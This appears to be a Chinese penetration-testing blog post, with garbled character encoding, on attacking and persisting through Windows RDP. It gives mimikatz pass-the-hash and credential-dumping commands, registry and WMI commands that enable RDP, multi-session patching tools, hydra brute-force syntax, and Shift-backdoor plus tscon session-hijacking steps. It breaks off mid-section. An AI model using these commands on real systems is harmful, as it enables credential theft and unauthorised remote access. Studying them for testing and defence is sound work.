<h3 id="Windows-ä½¿ç”¨-Hash-ç™»å½•"><a href="#Windows-ä½¿ç”¨-Hash-ç™»å½•" class="headerlink" title="Windows ä½¿ç”¨ Hash ç™»å½•"></a>Windows ä½¿ç”¨ Hash ç™»å½•</h3><h4 id="mstsc"><a href="#mstsc" class="headerlink" title="mstsc"></a>mstsc</h4><p>Serveréœ€è¦å¼€å¯ <strong>Restricted Admin modeï¼Œåœ¨Windows 8.1å’ŒWindows Server 2012 R2ä¸­é»˜è®¤å¼€å¯ï¼ŒåŒæ—¶å¦‚æœWin 7 å’ŒWindows Server 2008 R2å®‰è£…äº†2871997ã€2973351è¡¥ä¸ä¹Ÿæ”¯æŒï¼›Clientéœ€è¦æ”¯æŒ Restricted Admin mode</strong>ï¼Œå½“å‰ç³»ç»Ÿä¸æ”¯æŒï¼Œé“¾æ¥æ—¶å°†å‡ºç°å¦‚ä¸‹ï¼š</p>
<p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210621202739352.png)</p>
<p>å¯ä»¥é€šè¿‡å¦‚ä¸‹å‘½ä»¤å¼€å¯ Restricted Admin mode</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD &quot;HKLM\System\CurrentControlSet\Control\Lsa&quot; &#x2F;v DisableRestrictedAdmin &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f</span><br></pre></td></tr></table></figure>

<p>æŸ¥çœ‹æ˜¯å¦å·²ç»å¼€å¯</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG query &quot;HKLM\System\CurrentControlSet\Control\Lsa&quot; | findstr &quot;DisableRestrictedAdmin&quot;</span><br></pre></td></tr></table></figure>

<p>å¼€å¯åä½¿ç”¨ï¼šmstsc.exe /restrictedadmin è¿›è¡Œç™»å½•ä¸éœ€è¦å¯†ç ï¼Œå°†ä½¿ç”¨å½“å‰ç”¨æˆ·çš„hashè¿›è¡ŒéªŒè¯</p>
<p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210621202945033.png)</p>
<p>è¿˜æœ‰ä¸€ä¸ªæ¡ä»¶å°±æ˜¯æœ¬åœ°æœ‰rdpçš„å‡­æ®ï¼Œä¸ç„¶å°±ä¼šä¸‹é¢è¿™æ ·</p>
<p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210621203044329.png)</p>
<h4 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h4><ol>
<li>mimikatz.exe # éœ€è¦ç®¡ç†å‘˜æƒé™</li>
<li>privilege::debug</li>
<li>sekurlsa::pth /user:administrator /domain:remoteserver /ntlm:d25ecd13fddbb542d2e16da4f9e0333d â€œ/run:mstsc.exe /restrictedadminâ€</li>
</ol>
<h4 id="mimikatz-æŠ“å–hash"><a href="#mimikatz-æŠ“å–hash" class="headerlink" title="mimikatz æŠ“å–hash"></a>mimikatz æŠ“å–hash</h4><p>åœ¨Windows2000ä»¥åï¼ŒWindowsæœºå™¨éƒ½ç”¨NTLMç®—æ³•åœ¨æœ¬åœ°ä¿å­˜ç”¨æˆ·çš„å¯†ç ï¼Œå¯†ç çš„NTLMå“ˆå¸Œä¿å­˜åœ¨<code>%SystemRoot%\System32\config\SAM</code>æ–‡ä»¶ä¸­ã€‚ Windowsæ“ä½œç³»ç»Ÿé€šå¸¸ä½¿ç”¨ä¸¤ç§æ–¹æ³•å¯¹ç”¨æˆ·çš„å¯†ç è¿›è¡Œå“ˆå¸Œå¤„ç†ï¼Œå³ LAN Managerï¼ˆLMï¼‰å“ˆå¸Œå’Œ NT LAN Managerï¼ˆNTLMï¼‰å“ˆå¸Œã€‚æ‰€è°“å“ˆå¸Œï¼ˆHashï¼‰ï¼Œå³ä½¿ç”¨ä¸€ç§åŠ å¯†æ–¹æ³•å¯¹æ˜æ–‡å¯†ç è¿›è¡ŒåŠ å¯†ï¼Œå¯¹ä¸€ä¸ªä»»æ„é•¿åº¦çš„å­—ç¬¦ä¸²æ•°æ®è¿›è¡Œä¸€æ¬¡åŠ å¯†è¿ç®—ï¼Œéƒ½å¯ä»¥è¿”å›ä¸€ä¸ªå›ºå®šé•¿åº¦çš„å­—ç¬¦ä¸²ã€‚WindowsåŠ å¯†è¿‡çš„å¯†ç å£ä»¤ï¼Œæˆ‘ä»¬ç§°ä¹‹ä¸ºHashã€‚</p>
<p>Windowsæ“ä½œç³»ç»Ÿä¸­çš„å¯†ç ä¸€èˆ¬ç”±ä¸¤éƒ¨åˆ†ç»„æˆï¼šä¸€éƒ¨åˆ†ä¸ºLM Hashï¼Œå¦ä¸€éƒ¨åˆ†ä¸ºNTLM Hashã€‚åœ¨Windowsä¸­ï¼ŒHashçš„ç»“æ„é€šå¸¸å¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Username:RID:LM-Hash:NT-Hash</span><br></pre></td></tr></table></figure>

<p>åœ¨windows2000ä»¥åçš„ç³»ç»Ÿä¸­ï¼Œç¬¬ä¸€éƒ¨åˆ†çš„ LM-hash éƒ½æ˜¯ç©ºå€¼ï¼Œå› ä¸ºLM-hashå¯ä»¥å¾ˆå®¹æ˜“çš„ç ´è§£ï¼Œæ‰€ä»¥windows2000ä¹‹åè¿™ä¸ªå€¼é»˜è®¤ä¸ºç©ºï¼Œæ‰€ä»¥ç¬¬äºŒéƒ¨åˆ†çš„NTLM-hashæ‰çœŸæ­£æ˜¯ç”¨æˆ·å¯†ç çš„å“ˆå¸Œå€¼ã€‚</p>
<p>åœ¨æ¸—é€æµ‹è¯•ä¸­ï¼Œé€šå¸¸å¯<strong>ä»Windowsç³»ç»Ÿä¸­çš„SAMæ–‡ä»¶å’ŒåŸŸæ§çš„NTDS.ditæ–‡ä»¶ï¼ˆåœ¨åŸŸç¯å¢ƒä¸­ï¼Œç”¨æˆ·ä¿¡æ¯å­˜å‚¨åœ¨NTDS.ditä¸­ï¼‰ä¸­è·å¾—æ‰€æœ‰ç”¨æˆ·çš„Hashã€‚ä¹Ÿå¯ä»¥é€šè¿‡Mimikatzè¯»å–lsass.exeè¿›ç¨‹è·å¾—å·²ç™»å½•ç”¨æˆ·çš„NTLM hashå’Œæ˜æ–‡å€¼ ã€‚</strong></p>
<blockquote>
<p>æ³¨ï¼šä½†æ˜¯åœ¨å®‰è£…äº†KB2871997è¡¥ä¸æˆ–è€…ç³»ç»Ÿç‰ˆæœ¬å¤§äºwin10æˆ–windows server 2012æ—¶ï¼Œé»˜è®¤åœ¨å†…å­˜ç¼“å­˜ä¸­ç¦æ­¢ä¿å­˜æ˜æ–‡å¯†ç ï¼Œè¿™æ ·åˆ©ç”¨mimikatzå°±ä¸èƒ½ä»å†…å­˜ä¸­è¯»å‡ºæ˜æ–‡å¯†ç äº†ï¼Œä½†å¯ä»¥é€šè¿‡ä¿®æ”¹æ³¨å†Œè¡¨çš„æ–¹å¼æŠ“å–æ˜æ–‡ã€‚</p>
</blockquote>
<p>Mimikatzè¯»å–æ˜æ–‡å¯†ç å’Œhashä¹Ÿæ—¶æœ€å¸¸ç”¨çš„æ–¹æ³•ã€‚éœ€è¦ç®¡ç†å‘˜æƒé™ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug      &#x2F;&#x2F; æå‡è‡³debugæƒé™</span><br><span class="line">sekurlsa::logonpasswords       &#x2F;&#x2F; æŠ“å–å¯†ç </span><br></pre></td></tr></table></figure>

<h3 id="Linuxæ˜æ–‡ç™»å½•"><a href="#Linuxæ˜æ–‡ç™»å½•" class="headerlink" title="Linuxæ˜æ–‡ç™»å½•"></a>Linuxæ˜æ–‡ç™»å½•</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop ip:port</span><br></pre></td></tr></table></figure>

<h3 id="Mac"><a href="#Mac" class="headerlink" title="Mac"></a>Mac</h3><p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210621201013729.png)</p>
<hr>
<p>ä¸Šé¢å…¶å®ç®€å•æ¥è¯´éƒ½æ˜¯é’ˆå¯¹æ”¯æŒRDPçš„Windows server æ“ä½œç³»ç»Ÿçš„ã€‚è¿˜æœ‰Windows 7ã€8è¿™äº› æ²¡æœ‰serverçš„ã€‚rdpæœåŠ¡å¦‚ä½•å¼€å¯ï¼Ÿ</p>
<h2 id="Windows-Server-03"><a href="#Windows-Server-03" class="headerlink" title="Windows Server 03"></a>Windows Server 03</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">å¼€å¯ï¼š</span><br><span class="line">REG ADD \<span class="string">&quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\&quot; /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span></span><br><span class="line"><span class="string">å…³é—­ï¼š</span></span><br><span class="line"><span class="string">REG ADD \&quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\&quot; /v fDenyTSConnections /t REG_DWORD /d 11111111 /f</span></span><br><span class="line"><span class="string">å¼€å¯ï¼š</span></span><br><span class="line"><span class="string">wmic RDTOGGLE WHERE ServerName=&#x27;%COMPUTERNAME%&#x27; call SetAllowTSConnections 1</span></span><br><span class="line"><span class="string">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot;</span> <span class="string">&quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span></span><br><span class="line"><span class="string">REG ADD &quot;</span>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server<span class="string">&quot; /v fDenyTSConnections /t REG_DWORD /d 0 /f</span></span><br></pre></td></tr></table></figure>

<p>æˆ–è€…</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic path win32_terminalservicesetting where (__CLASS !&#x3D; &quot;&quot;) call setallowtsconnections 1</span><br></pre></td></tr></table></figure>



<h2 id="Windows-Xp"><a href="#Windows-Xp" class="headerlink" title="Windows Xp"></a>Windows Xp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic path win32_terminalservicesetting where (__CLASS !&#x3D; &quot;&quot;) call setallowtsconnections 1</span><br></pre></td></tr></table></figure>

<h2 id="Windows-8"><a href="#Windows-8" class="headerlink" title="Windows 8"></a>Windows 8</h2><p>ä¸‰æ¡å‘½ä»¤å³å¯ï¼š</p>
<ol>
<li>wmic /namespace:\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS != â€œâ€) call setallowtsconnections 1</li>
<li>wmic /namespace:\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName =â€™RDP-Tcpâ€™) call setuserauthenticationrequired 1</li>
<li>reg add â€œHKLM\SYSTEM\CurrentControlSet\Control\Terminal Serverâ€ /v fSingleSessionPerUser /t REG_DWORD /d 0 /f</li>
</ol>
<p>æˆ–è€…reg</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; &#x2F;v PortNumber &#x2F;t REG_DWORD &#x2F;d 0x00000d3d &#x2F;f</span><br></pre></td></tr></table></figure>



<h2 id="Windows-2012"><a href="#Windows-2012" class="headerlink" title="Windows 2012"></a>Windows 2012</h2><p>é€šç”¨</p>
<h2 id="Windows-7"><a href="#Windows-7" class="headerlink" title="Windows 7"></a>Windows 7</h2><ol>
<li>wmic /namespace:\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS != â€œâ€) call setallowtsconnections 1</li>
<li>wmic /namespace:\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName =â€™RDP-Tcpâ€™) call setuserauthenticationrequired 1</li>
</ol>
<p>ä»¥ä¸Šå‰ææ¡ä»¶æ˜¯ç¡®ä¿Windows Management Instrumentationï¼ˆWinmgmtï¼‰æœåŠ¡å·²æ­£å¸¸å¯åŠ¨ï¼Œæƒé™ä¸ºç®¡ç†å‘˜æƒé™ã€‚</p>
<h2 id="Windows-2016"><a href="#Windows-2016" class="headerlink" title="Windows 2016"></a>Windows 2016</h2><p>Server 2016 é»˜è®¤è¿œç¨‹æ¡Œé¢è¿æ¥æ•°æ˜¯ 2 ä¸ªç”¨æˆ·ï¼Œå¦‚æœå¤šä½™ä¸¤ä¸ªç”¨æˆ·è¿›è¡Œè¿œç¨‹æ¡Œé¢è¿æ¥æ—¶ï¼Œç³»ç»Ÿå°±ä¼šæç¤ºè¶…è¿‡è¿æ¥æ•°</p>
<p>ä½¿ç”¨powershell,</p>
<p>è®¾ç½® fDenyTSConnections ä¸º0ï¼Œå…è®¸Terminal Servicesã€‚</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">New-ItemProperty</span> <span class="literal">-Path</span> <span class="string">&#x27;HKLM:SystemCurrentControlSetControlTerminal Server&#x27;</span> <span class="literal">-Name</span> <span class="string">&#x27;fDenyTSConnections&#x27;</span> <span class="literal">-Value</span> <span class="number">0</span> <span class="literal">-PropertyType</span> dword <span class="literal">-Force</span></span><br></pre></td></tr></table></figure>

<p>å¼€å¯ç”¨æˆ·éªŒè¯ï¼Œæ¨èé»˜è®¤å¼€å¯ï¼Œä½†æ˜¯ä½œä¸ºæ¸—é€æµ‹è¯•çš„è¯ï¼Œåº”è¯¥æ˜¯å¯ä»¥ä¸ç”¨çš„</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">New-ItemProperty</span> <span class="literal">-Path</span> <span class="string">&#x27;HKLM:SystemCurrentControlSetControlTerminal ServerWinStationsRDP-Tcp&#x27;</span> <span class="literal">-Name</span> <span class="string">&#x27;UserAuthentication&#x27;</span> <span class="literal">-Value</span> <span class="number">1</span> <span class="literal">-PropertyType</span> dword <span class="literal">-Force</span></span><br></pre></td></tr></table></figure>

<p>æ·»åŠ é˜²ç«å¢™è§„åˆ™</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Enable-NetFirewallRule</span> <span class="literal">-DisplayGroup</span> <span class="string">&#x27;Remote Desktop&#x27;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Enable Remote Desktop</span></span><br><span class="line">(<span class="built_in">Get-WmiObject</span> Win32_TerminalServiceSetting <span class="literal">-Namespace</span> root\cimv2\TerminalServices).SetAllowTsConnections(<span class="number">1</span>,<span class="number">1</span>) | <span class="built_in">Out-Null</span></span><br><span class="line">(<span class="built_in">Get-WmiObject</span> <span class="literal">-Class</span> <span class="string">&quot;Win32_TSGeneralSetting&quot;</span> <span class="literal">-Namespace</span> root\cimv2\TerminalServices <span class="literal">-Filter</span> <span class="string">&quot;TerminalName=&#x27;RDP-tcp&#x27;&quot;</span>).SetUserAuthenticationRequired(<span class="number">0</span>) | <span class="built_in">Out-Null</span></span><br><span class="line"><span class="built_in">Get-NetFirewallRule</span> <span class="literal">-DisplayName</span> <span class="string">&quot;Remote Desktop*&quot;</span> | <span class="built_in">Set-NetFirewallRule</span> <span class="literal">-enabled</span> true</span><br></pre></td></tr></table></figure>

<h2 id="Windows-Server-2019"><a href="#Windows-Server-2019" class="headerlink" title="Windows Server 2019"></a>Windows Server 2019</h2><p>å¼€å¯RDPæœåŠ¡</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-ItemProperty -Path &#39;HKLM:\System\CurrentControlSet\Control\Terminal Server&#39; -name &quot;fDenyTSConnections&quot; -value 0</span><br></pre></td></tr></table></figure>

<p>æ·»åŠ é˜²ç«å¢™è§„åˆ™å…è®¸RDP</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Enable-NetFirewallRule -DisplayGroup &quot;Remote Desktop&quot;</span><br></pre></td></tr></table></figure>



<h2 id="éæœåŠ¡å™¨ç‰ˆæœ¬çš„Windowsç³»ç»Ÿæ”¯æŒå¤šç”¨æˆ·ç™»å½•çš„æ–¹æ³•"><a href="#éæœåŠ¡å™¨ç‰ˆæœ¬çš„Windowsç³»ç»Ÿæ”¯æŒå¤šç”¨æˆ·ç™»å½•çš„æ–¹æ³•" class="headerlink" title="éæœåŠ¡å™¨ç‰ˆæœ¬çš„Windowsç³»ç»Ÿæ”¯æŒå¤šç”¨æˆ·ç™»å½•çš„æ–¹æ³•"></a>éæœåŠ¡å™¨ç‰ˆæœ¬çš„Windowsç³»ç»Ÿæ”¯æŒå¤šç”¨æˆ·ç™»å½•çš„æ–¹æ³•</h2><p>ä¸»è¦æ˜¯3gstudent å¸ˆå‚…åšå®¢çš„æ€è·¯ï¼Œ</p>
<blockquote>
<p>éæœåŠ¡å™¨ç‰ˆæœ¬çš„Windowsç³»ç»Ÿé»˜è®¤åªå…è®¸ä¸€ä¸ªè´¦æˆ·ç™»å½•</p>
</blockquote>
<p>å…·ä½“è¡¨ç°ä¸ºï¼š</p>
<ul>
<li>è¿œç¨‹ç™»å½•æ—¶ï¼Œä½¿ç”¨ä¸åŸç³»ç»Ÿç›¸åŒçš„è´¦æˆ·ï¼ŒåŸç³»ç»Ÿå°†è¢«åˆ‡æ¢åˆ°ç™»å½•ç•Œé¢</li>
<li>ä½¿ç”¨ä¸åŒçš„è´¦æˆ·ï¼Œç™»å½•æ—¶æç¤ºå…¶ä»–ç”¨æˆ·å·²ç™»å½•åˆ°æ­¤è®¡ç®—æœº</li>
<li>é€‰æ‹©ç»§ç»­åï¼ŒåŸç³»ç»Ÿæ¡Œé¢å°†å¼¹æ¡†æç¤ºæ˜¯å¦æ–­å¼€å½“å‰è¿æ¥(30ç§’åé»˜è®¤é€‰æ‹©åŒæ„ï¼Œé€€å›åˆ°ç™»å½•ç•Œé¢)</li>
</ul>
<h3 id="1-ä½¿ç”¨mimikatz"><a href="#1-ä½¿ç”¨mimikatz" class="headerlink" title="1. ä½¿ç”¨mimikatz"></a>1. ä½¿ç”¨mimikatz</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">ts::multirdp</span><br></pre></td></tr></table></figure>

<p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210622161621291.png)</p>
<p>å¼€å¯å¤šç”¨æˆ·ç™»å½•åŠŸèƒ½ï¼Œæœ€é«˜æ”¯æŒåˆ°Win7</p>
<p><strong>ä½¿ç”¨ä¸åŸç³»ç»Ÿç›¸åŒçš„è´¦æˆ·ï¼ŒåŸç³»ç»Ÿè¿˜æ˜¯ä¼šè¢«åˆ‡æ¢åˆ°ç™»å½•ç•Œé¢</strong></p>
<p>ä½¿ç”¨ä¸åŸç³»ç»Ÿä¸åŒçš„è´¦æˆ·ï¼Œç™»å½•æˆåŠŸã€‚</p>
<h3 id="2-ä¿®æ”¹termsrv-dll"><a href="#2-ä¿®æ”¹termsrv-dll" class="headerlink" title="2. ä¿®æ”¹termsrv.dll"></a>2. ä¿®æ”¹termsrv.dll</h3><p>åŸç†ï¼šWindowsåœ¨å¼€å¯æœåŠ¡Remote Desktop Servicesæ—¶ï¼Œä¼šåŠ è½½termsrv.dl</p>
<p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210622161930740.png)</p>
<p>é€šè¿‡ä¿®æ”¹å†…å­˜ä¸­çš„termsrv.dllå®ç°å¼€å¯å¤šç”¨æˆ·åŠŸèƒ½</p>
<p>ä¸è¿›ä¸€æ­¥æ·±å…¥äº†ï¼ŒæŠ€æœ¯æ°´å¹³è¿˜æœ‰é™ã€‚</p>
<h3 id="3-ä½¿ç”¨rdpwrap"><a href="#3-ä½¿ç”¨rdpwrap" class="headerlink" title="3. ä½¿ç”¨rdpwrap"></a>3. ä½¿ç”¨rdpwrap</h3><p>å½“ä¸ªjbå°å­æ¯”è¾ƒé€‚åˆæˆ‘ï¼Œæ‰€ä»¥çœ‹ç¬¬ä¸‰ç§æ–¹æ³•ï¼Œä½¿ç”¨rdpwrapè¿™ä¸ªå·¥å…·ã€‚</p>
<p><a target="_blank" rel="noopener" href="https://github.com/stascorp/rdpwrap">https://github.com/stascorp/rdpwrap</a></p>
<p>C# ç‰ˆæœ¬ï¼š<a target="_blank" rel="noopener" href="https://github.com/infosecn1nja/SharpDoor">https://github.com/infosecn1nja/SharpDoor</a></p>
<blockquote>
<p>SharpDoor is alternative RDPWrap written in C# to allowed multiple RDP (Remote Desktop) sessions by patching termsrv.dll file, for opsec considerations SharpDoor still using cmd.exe to run sc services to impersonating as trustedinstaller in the future will be avoiding cmd.exe usage, currently <strong>only support for Windows 10.</strong></p>
</blockquote>
<p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210622162436228.png)</p>
<p>RDP Wrapper works as a layer between Service Control Manager and Terminal Services, so the original termsrv.dll file remains untouched. Also this method is very strong against Windows Update.</p>
<p>ä¸ä¿®æ”¹termsrv.dllï¼Œé€šè¿‡ä¼ å…¥ä¸åŒå‚æ•°å®ç°</p>
<p>å®‰è£…ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RDPWInst.exe -i is</span><br></pre></td></tr></table></figure>

<p>é‡Šæ”¾rdpwrap.dllå’Œrdpwrap.iniè‡³System32æ–‡ä»¶å¤¹</p>
<p>rdpwrap.dllä¼šè¢«åŠ è½½åˆ°åŒtermsrv.dllç›¸åŒçš„è¿›ç¨‹</p>
<p>æ­¤æ—¶ï¼Œèƒ½å¤Ÿä½¿ç”¨ä¸åŒç”¨æˆ·è¿›è¡Œè¿œç¨‹è¿æ¥</p>
<p>å¸è½½ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RDPWInst.exe -u</span><br></pre></td></tr></table></figure>

<h2 id="ç¡®å®šRDPæœ‰æ•ˆç”¨æˆ·å"><a href="#ç¡®å®šRDPæœ‰æ•ˆç”¨æˆ·å" class="headerlink" title="ç¡®å®šRDPæœ‰æ•ˆç”¨æˆ·å"></a>ç¡®å®šRDPæœ‰æ•ˆç”¨æˆ·å</h2><h3 id="æ˜æ–‡å¯†ç "><a href="#æ˜æ–‡å¯†ç " class="headerlink" title="æ˜æ–‡å¯†ç "></a>æ˜æ–‡å¯†ç </h3><h4 id="RDPæš´ç ´"><a href="#RDPæš´ç ´" class="headerlink" title="RDPæš´ç ´"></a>RDPæš´ç ´</h4><p>è¶…çº§å¼±å£ä»¤ï¼ˆğŸ¶ï¼‰</p>
<p>Lodon <a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon/releases">https://github.com/k8gege/Ladon/releases</a></p>
<p>Goby</p>
<p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210622211811732.png)</p>
<p>Hydra</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra 192.168.1.2 rdp -L user.txt -P pass.txt -V</span><br></pre></td></tr></table></figure>

<h4 id="SMBçˆ†ç ´"><a href="#SMBçˆ†ç ´" class="headerlink" title="SMBçˆ†ç ´"></a>SMBçˆ†ç ´</h4><p>msf</p>
<p>auxiliary/scanner/smb/smb_login</p>
<p>Ladon</p>
<p><a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon/releases">https://github.com/k8gege/Ladon/releases</a></p>
<p>Goby</p>
<p>ä¸è¿‡è¿™ç§æš´ç ´çš„ï¼Œæ“ä½œï¼Œå¤ªåš£å¼ äº†ï¼Œæ¨èå‡Œæ™¨çš„æ—¶å€™æã€‚</p>
<h3 id="Hash"><a href="#Hash" class="headerlink" title="Hash"></a>Hash</h3><p>Impacketå·¥å…·åŒ…ä¸­çš„rdp_check.py è„šæœ¬å¯ä»¥é€šè¿‡hashç¡®å®šç›®æ ‡æœºå™¨æ˜¯å¦å­˜åœ¨æšä¸¾çš„ç”¨æˆ·</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">usage: rdp_check.py [-h] [-hashes LMHASH:NTHASH] target</span><br><span class="line"></span><br><span class="line">Test whether an account is valid on the target host using the RDP protocol.</span><br><span class="line"></span><br><span class="line">positional arguments:</span><br><span class="line">  target                [[domain&#x2F;]username[:password]@]&lt;targetName or address&gt;</span><br><span class="line"></span><br><span class="line">optional arguments:</span><br><span class="line">  -h, --help            show this help message and exit</span><br><span class="line"></span><br><span class="line">authentication:</span><br><span class="line">  -hashes LMHASH:NTHASH</span><br><span class="line">                        NTLM hashes, format is LMHASH:NTHASH</span><br></pre></td></tr></table></figure>

<p>python rdp_check.py ./administrator@10.97.45.11 -hashes :618B18AD4171A53695DD997AB02D55C4</p>
<h2 id="RDP-æƒé™ç»´æŒ"><a href="#RDP-æƒé™ç»´æŒ" class="headerlink" title="RDP æƒé™ç»´æŒ"></a>RDP æƒé™ç»´æŒ</h2><p>åŸæ–‡åœ°å€ï¼š<a target="_blank" rel="noopener" href="http://t3ngyu.leanote.com/post/LM-RDP">http://t3ngyu.leanote.com/post/LM-RDP</a></p>
<h3 id="1-å…³é—­RDP-å®‰å…¨è®¤è¯"><a href="#1-å…³é—­RDP-å®‰å…¨è®¤è¯" class="headerlink" title="1. å…³é—­RDP å®‰å…¨è®¤è¯"></a>1. å…³é—­RDP å®‰å…¨è®¤è¯</h3><p>â€‹    å½“æœåŠ¡å™¨å¼€å¯å®‰å…¨è®¤è¯æ—¶ï¼Œå¿…é¡»å…ˆé€šè¿‡ç™»é™†å¯†ç æ‰èƒ½è¿›å…¥è¿œç¨‹æ¡Œé¢ï¼›å¦‚æœæœåŠ¡ç«¯ç”¨çš„æ˜¯ä¸å®‰å…¨çš„è®¤è¯æ–¹å¼ï¼Œå³å¯ä»¥å…ˆè¿œç¨‹é“¾æ¥åç™»é™†å¯ä»¥è§¦å‘Shiftåé—¨</p>
<p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210622165057305.png)</p>
<p>å¦‚ä½•è®¾ç½®ä¸å®‰å…¨çš„è¿æ¥ï¼Œå»æ‰â€ä»…å…è®¸ä½¿ç”¨ç½‘ç»œçº§åˆ«çš„èº«ä»½éªŒè¯çš„è¿œç¨‹æ¡Œé¢çš„è®¡ç®—æœºè¿æ¥â€é€‰é¡¹ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯<strong>å…ˆä¸Šç³»ç»ŸåéªŒè¯ä¹Ÿä¼šåœ¨è®¡ç®—æœºæœ¬åœ°ç•™ä¸‹ä¸€å®šçš„è¿›ç¨‹ã€æ—¥å¿—ã€‚</strong></p>
<p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210622165215060.png)</p>
<h3 id="2-Shiftåé—¨-RDP-Session-åŠ«æŒ"><a href="#2-Shiftåé—¨-RDP-Session-åŠ«æŒ" class="headerlink" title="2. Shiftåé—¨ + RDP Session åŠ«æŒ"></a>2. Shiftåé—¨ + RDP Session åŠ«æŒ</h3><p>è¦ç”¨åˆ°çš„å·¥å…·ï¼Œtsconï¼Œå¾®è½¯è‡ªå¸¦ã€‚</p>
<p>é…åˆä¸Šé¢çš„å…³é—­RDPå®‰å…¨è®¤è¯æ–¹å¼ï¼Œåˆ©ç”¨<strong>Shiftåé—¨å¯ä»¥è®©æ”»å‡»è€…å¿«é€Ÿè·å¾—Systemæƒé™</strong>ï¼Œç»“åˆRDPåŠ«æŒå¯ä»¥å®ç°æ— éœ€åˆ›å»ºç”¨æˆ·ã€ä¸æ›´æ”¹åŠ«æŒç”¨æˆ·ç™»å½•æ—¶é—´ã€è§£é”åŠ«æŒç”¨æˆ·ç•Œé¢ã€ç­‰åŠŸèƒ½ã€‚æ³¨æ„<strong>RDPåŠ«æŒéœ€è¦Systemæƒé™</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tscon id # (è¦åŠ«æŒçš„ç”¨æˆ·idï¼Œquery useræŸ¥çœ‹)</span><br></pre></td></tr></table></figure>

<p>å¦å¤–ä¸€ç§æ–¹æ³•å¯ä»¥é€šè¿‡åˆ›å»ºæœåŠ¡æ¿€æ´»ï¼š</p>
